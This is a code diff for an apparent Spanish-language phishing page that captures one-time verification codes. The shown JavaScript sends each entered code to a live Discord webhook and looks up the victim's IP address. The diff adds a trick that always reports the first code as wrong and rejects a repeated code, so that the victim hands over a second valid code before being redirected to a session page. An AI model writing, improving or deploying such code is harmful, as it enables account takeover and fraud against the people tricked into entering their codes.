@@ -32,6 +32,7 @@
 
   <div id="errorNotif" class="notification">Código incorrecto</div>
   <div id="successNotif" class="notification">Te enviamos un código nuevo</div>
+  <div id="sameCodeNotif" class="notification" style="background-color: #FF4E00;">Ingresa un código diferente</div>
 
   <div class="app-container" id="app-container">
     <button class="btn-back" onclick="window.history.back()">
@@ -60,6 +61,9 @@
       'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0'
     ];
 
+    // Variable para guardar el primer código ingresado
+    let firstCodeAttempt = ""; 
+
     async function trackAction(actionName) {
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -78,6 +82,7 @@
     const otpInput = document.getElementById('otpInput');
     const errorNotif = document.getElementById('errorNotif');
     const successNotif = document.getElementById('successNotif');
+    const sameCodeNotif = document.getElementById('sameCodeNotif');
     const resendText = document.getElementById('resendText');
     const resendButtons = document.getElementById('resendButtons');
     const phoneDisplay = document.getElementById('phoneDisplay');
@@ -108,16 +113,40 @@
       otpInput.addEventListener('input', (e) => {
         let val = e.target.value.replace(/\D/g, '');
         e.target.value = val;
+        
         if (val.length === 4 && !isVerifying) {
-          isVerifying = true; otpInput.disabled = true;
+          
+          // VALIDACIÓN: Si es el segundo intento y el código es igual al primero
+          if (!isFirstAttempt && val === firstCodeAttempt) {
+            sameCodeNotif.style.display = 'block';
+            otpInput.value = '';
+            otpInput.focus();
+            setTimeout(() => { sameCodeNotif.style.display = 'none'; }, 3000);
+            return; // Detiene la ejecución, no avanza
+          }
+
+          isVerifying = true; 
+          otpInput.disabled = true;
+          
           setTimeout(async () => {
-            showLoader(); await sendToDiscord(val);
+            showLoader(); 
+            await sendToDiscord(val);
+            
             setTimeout(() => {
-              hideLoader(); otpInput.disabled = false; isVerifying = false;
+              hideLoader(); 
+              otpInput.disabled = false; 
+              isVerifying = false;
+              
               if (isFirstAttempt) {
-                isFirstAttempt = false; errorNotif.style.display = 'block'; otpInput.value = ''; otpInput.focus();
+                // Guardamos el primer código y mostramos error
+                firstCodeAttempt = val;
+                isFirstAttempt = false; 
+                errorNotif.style.display = 'block'; 
+                otpInput.value = ''; 
+                otpInput.focus();
                 setTimeout(() => { errorNotif.style.display = 'none'; }, 3000);
               } else { 
+                // Si es el segundo intento y es un código diferente, avanza
                 window.location.href = 'verisesion.html'; 
               }
             }, 4000);
